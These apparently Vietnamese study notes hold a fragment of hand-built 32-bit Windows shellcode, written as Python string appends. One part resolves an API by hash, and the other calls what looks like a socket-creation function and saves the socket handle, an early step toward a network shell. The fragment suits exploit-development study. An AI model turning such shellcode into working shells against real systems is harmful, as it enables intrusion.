## Assembly:
### Tìm hàm
```
code += "push 0xadf509d9;"
code += "call dword ptr [ebp+0x4];"
code += "mov [ebp + 0x10], eax;"
```
### Gọi hàm
```
code += "xor eax, eax;"
code += "push eax;"
code += "push eax;"
code += "push eax;"
code += "mov al, 0x06;"
code += "push eax;"
code += "sub al, 0x05;"
code += "push eax;"
code += "inc eax;"
code += "push eax;"
code += "call dword ptr [ebp + 0x10];"
code += "mov esi, eax;" # save socket description
```
